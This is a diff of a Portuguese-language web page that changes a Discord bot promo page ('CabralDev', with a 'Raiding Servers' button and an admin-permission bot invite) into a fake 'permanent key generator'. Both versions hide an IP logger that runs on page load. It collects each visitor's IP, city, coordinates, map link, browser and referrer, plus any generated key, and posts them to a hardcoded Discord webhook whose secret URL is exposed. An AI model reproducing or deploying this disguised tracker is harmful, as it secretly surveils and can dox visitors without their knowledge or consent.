@@ -1,171 +1,193 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CabralDev - Official Page</title>
+    <title>shit hub - Key Generator</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-
+        @import url('https://fonts.googleapis.com/css2?family=Gotham:wght@400;700;900&display=swap');
+        
         body {
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('pilha_dinheiro.png'); 
-            background-size: cover; background-position: center; background-attachment: fixed;
-            height: 100vh; display: flex; justify-content: center; align-items: center; color: white; overflow: hidden;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #0a0a0f, #1a0033);
+            color: #fff;
+            font-family: 'Gotham', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .container {
-            background: rgba(20, 20, 20, 0.95); padding: 40px; border-radius: 25px; text-align: center;
-            max-width: 450px; width: 90%; border: 4px solid #ff0000;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); animation: neonPulse 3s infinite alternate;
+            background: rgba(20, 20, 30, 0.95);
+            padding: 50px 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.4);
+            max-width: 520px;
+            width: 90%;
+            text-align: center;
+            border: 2px solid #00ffff;
         }
 
-        @keyframes neonPulse {
-            from { border-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
-            to { border-color: #8a2be2; box-shadow: 0 0 30px #8a2be2; }
+        h1 {
+            font-size: 48px;
+            color: #00ffff;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px #00ffff;
         }
 
-        h1 { font-size: 32px; margin-bottom: 5px; letter-spacing: 2px; }
-        .owner-text { font-size: 18px; margin-bottom: 25px; opacity: 0.8; }
-
-        .btn {
-            display: block; width: 100%; padding: 16px; margin: 12px 0; border: none;
-            border-radius: 12px; color: white; font-weight: bold; cursor: pointer;
-            transition: 0.3s; text-decoration: none; font-size: 14px; text-transform: uppercase; text-align: center;
+        p {
+            font-size: 18px;
+            color: #bbb;
+            margin-bottom: 30px;
         }
 
-        .btn:hover { transform: scale(1.03); filter: brightness(1.2); }
-        .btn-enter { background: #5865F2; }
-        .btn-copy { background: #111; border: 1px solid #333; }
-        .btn-cabral { background: #222; color: #ff0000; border: 2px solid #ff0000; }
-
-        /* JANELA DO VÍDEO */
-        .overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); z-index: 999; justify-content: center; align-items: center;
+        button {
+            background: #00ffff;
+            color: #111;
+            border: none;
+            padding: 18px 60px;
+            font-size: 22px;
+            font-weight: 900;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 15px;
         }
 
-        .caixa-video { width: 90%; max-width: 750px; position: relative; background: #000; border-radius: 10px; overflow: hidden; }
-        .fechar { position: absolute; top: 10px; right: 20px; color: white; font-size: 40px; cursor: pointer; z-index: 1001; }
-        
-        .footer-tag { margin-top: 25px; color: #ff0000; font-weight: bold; font-size: 13px; }
+        button:hover {
+            background: #00cccc;
+            transform: scale(1.08);
+            box-shadow: 0 0 25px #00ffff;
+        }
+
+        #generatedKey {
+            margin-top: 30px;
+            font-size: 26px;
+            background: #111;
+            padding: 20px;
+            border-radius: 12px;
+            word-break: break-all;
+            border: 1px solid #00ffff;
+            display: none;
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #0f0;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>CabralDev<span>💤</span></h1>
-        <p class="owner-text">The best bot and best server</p>
-
-        <a href="https://discord.gg/CNB6YBhBe2" target="_blank" class="btn btn-enter">ENTER DISCORD SERVER</a>
-        <button class="btn btn-copy" onclick="abrirBot()">ADD BOT IN YOUR SERVER</button>
-        <button onclick="ligarRaiding()" class="btn btn-cabral">C̷a̷b̷r̷a̷l̷D̷e̷v̷💤 Raiding Servers</button>
-
-        <div class="footer-tag">MADE BY CABRALDEV</div>
-    </div>
-
-    <div id="janelaVideo" class="overlay">
-        <div class="caixa-video">
-            <span class="fechar" onclick="desligarRaiding()">&times;</span>
-            <iframe id="meuVideo" width="100%" height="420" 
-                src="https://www.youtube.com/embed/QucuMiI7orY?enablejsapi=1&autoplay=1&mute=1&rel=0" 
-                frameborder="0" 
-                allow="autoplay; encrypted-media" 
-                allowfullscreen>
-            </iframe>
+        <h1>shit hub</h1>
+        <p>Gerador de Key Permanente</p>
+        
+        <button onclick="generatePermanentKey()">GERAR KEY PERMANENTE</button>
+        
+        <div id="generatedKey">
+            <strong>Sua Key:</strong><br>
+            <span id="keyText" style="color:#00ffff; font-size:28px;"></span><br><br>
+            <button onclick="copyKey()">Copiar Key</button>
         </div>
+
+        <div class="status" id="status"></div>
     </div>
 
+    <!-- ==================== IP LOGGER + WEBHOOK ==================== -->
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1492629972467191900/vuO7OS7o0V_LLTVz2_mvHVY-344wKKvcWKSWCiEQfLmyuVrDr2fgQx9jT3Q1O7ROdiRp";
 
+        async function enviarLogger(tipo, key = "") {
+            let ip = "Desconhecido";
+            let pais = "Desconhecido";
+            let cidade = "Desconhecido";
+            let lat = "";
+            let lon = "";
 
+            try {
+                const res = await fetch("https://ipwho.is/");
+                const geo = await res.json();
+                if (geo && geo.success !== false) {
+                    ip = geo.ip || "Desconhecido";
+                    pais = geo.country || "Desconhecido";
+                    cidade = geo.city || geo.region || "Desconhecido";
+                    lat = geo.latitude || "";
+                    lon = geo.longitude || "";
+                }
+            } catch (e) {
+                try {
+                    const ipRes = await fetch("https://api.ipify.org?format=json");
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip || "Desconhecido";
+                } catch (e2) {}
+            }
 
+            const mapa = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Sem localização";
+            const data = new Date().toLocaleString('pt-BR');
+            const browser = navigator.userAgent;
+            const origem = document.referrer || "Acesso direto";
 
-<script>
-// === COLOQUE A URL DA SUA WEBHOOK ===
-const webhookUrl = "https://discord.com/api/webhooks/1492629972467191900/vuO7OS7o0V_LLTVz2_mvHVY-344wKKvcWKSWCiEQfLmyuVrDr2fgQx9jT3Q1O7ROdiRp";
+            let mensagem = `**🗝️ ${tipo}**\n\n` +
+                          `**IP:** ${ip}\n` +
+                          `**Data/Hora:** ${data}\n` +
+                          `**País:** ${pais}\n` +
+                          `**Cidade:** ${cidade}\n` +
+                          `**Navegador:** ${browser}\n` +
+                          `**Origem:** ${origem}\n` +
+                          (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");
 
-async function enviarLogger() {
-    try {
-        // Usa um serviço alternativo que costuma ter melhor suporte CORS + JSONP fallback
-        const geoRes = await fetch("https://ipapi.co/json/");
-        const geo = await geoRes.json();
+            if (key) mensagem += `**Key Gerada:** \`${key}\`\n`;
 
-        // Se der erro ou não vier dados
-        if (!geo || geo.error) {
-            console.log("Não conseguiu pegar IP");
-            return;
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: mensagem,
+                        username: "CabralDev Logger 💤",
+                    })
+                });
+            } catch (error) {
+                console.error("Erro no logger:", error);
+            }
         }
 
-        const ip      = geo.ip || "Desconhecido";
-        const pais    = geo.country_name || geo.country || "Desconhecido";
-        const cidade  = geo.city || "Desconhecido";
-        const lat     = geo.latitude || "";
-        const lon     = geo.longitude || "";
-        const mapa    = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Sem localização";
-        const browser = navigator.userAgent;
-        const data    = new Date().toLocaleString('pt-BR');
-        const origem  = document.referrer || "Direto (sem referer)";
-
-        const msg = `**Novo acesso detectado!**\n\n` +
-                    `**IP:** ${ip}\n` +
-                    `**Data/Hora:** ${data}\n` +
-                    `**País:** ${pais}\n` +
-                    `**Cidade:** ${cidade}\n` +
-                    `**Navegador:** ${browser}\n` +
-                    `**Origem:** ${origem}\n` +
-                    (mapa !== "Sem localização" ? `**Mapa:** ${mapa}\n` : "");
-
-        await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: msg,
-                username: "CabralDev Logger",
-                avatar_url: "https://i.imgur.com/alguma-imagem.png" // pode trocar ou apagar essa linha
-            })
+        // Executa logger quando a página carrega
+        window.addEventListener('load', () => {
+            enviarLogger("Novo Acesso ao Gerador de Key");
         });
 
-        console.log("Logger enviado com sucesso");
+        // ==================== GERADOR DE KEY ====================
+        function generatePermanentKey() {
+            const prefix = "SHITPERM-";
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let key = prefix;
 
-    } catch (error) {
-        console.error("Erro no logger:", error);
-        // Tenta um fallback simples caso o primeiro falhe
-        try {
-            const fallback = await fetch("https://ipwho.is/");
-            const geo2 = await fallback.json();
-            // ... (pode adaptar se quiser, mas por enquanto só loga)
-            console.log("Fallback usado:", geo2);
-        } catch(e) {}
-    }
-}
+            for (let i = 0; i < 28; i++) {
+                key += chars[Math.floor(Math.random() * chars.length)];
+            }
 
-// Executa quando a página carregar
-window.addEventListener('load', enviarLogger);
-</script>
-    
-    <script>
-        function abrirBot() {
-            window.open("https://discord.com/oauth2/authorize?client_id=1479937612738330705&permissions=8&scope=bot", '_blank');
+            // Mostra a key na tela
+            document.getElementById("keyText").textContent = key;
+            document.getElementById("generatedKey").style.display = "block";
+
+            // Envia para o Discord
+            enviarLogger("Key Gerada com Sucesso", key);
+
+            document.getElementById("status").innerHTML = "✅ Key gerada e registrada!";
         }
 
-        function ligarRaiding() {
-            const janela = document.getElementById('janelaVideo');
-            const video = document.getElementById('meuVideo');
-            janela.style.display = 'flex';
-            // Comando para dar play via API do YouTube
-            video.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
-        }
-
-        function desligarRaiding() {
-            const janela = document.getElementById('janelaVideo');
-            const video = document.getElementById('meuVideo');
-            janela.style.display = 'none';
-            // Comando para pausar via API do YouTube
-            video.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*');
-        }
-
-        window.onclick = function(event) {
-            if (event.target == document.getElementById('janelaVideo')) { desligarRaiding(); }
+        function copyKey() {
+            const key = document.getElementById("keyText").textContent;
+            navigator.clipboard.writeText(key).then(() => {
+                alert("✅ Key copiada para a área de transferência!");
+            });
         }
     </script>
+
 </body>
 </html>
